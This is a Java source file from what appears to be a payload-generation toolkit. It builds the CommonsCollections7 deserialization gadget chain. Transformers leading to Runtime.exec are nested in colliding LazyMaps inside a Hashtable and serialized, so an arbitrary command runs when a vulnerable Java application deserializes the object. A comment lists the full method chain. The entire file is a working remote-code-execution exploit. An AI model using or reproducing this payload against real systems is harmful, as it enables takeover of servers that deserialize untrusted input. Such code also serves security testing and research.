package com.exp.collections;


import com.constant.PayloadGenerator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.File;
import java.lang.reflect.Modifier;
import java.util.*;

/*
    Payload method chain:
    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/

public class CommonsCollections7 extends PayloadGenerator {
    @Override
    protected File generatorPayload(String[] cmd) {
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmd})};
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        HashMap<Object, Object> hashMap = new HashMap<>();
        HashMap<Object, Object> hashMap1 = new HashMap<>();

        Map lazyMap = LazyMap.decorate(hashMap,chainedTransformer);
        lazyMap.put("yy",1);
        lazyMap.hashCode();
        Map lazyMap1 = LazyMap.decorate(hashMap1,chainedTransformer);
        lazyMap1.put("zZ",1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
        hashtable.put(lazyMap1,2);


        CommonsCollections7 commonsCollections7 = new CommonsCollections7();
        commonsCollections7.setValueByField("iTransformers",chainedTransformer,transformers, Modifier.PROTECTED);
        // 删除键，保证反序列化时key数量一致
        lazyMap1.remove("yy");
        return serializable(hashtable);
    }
}
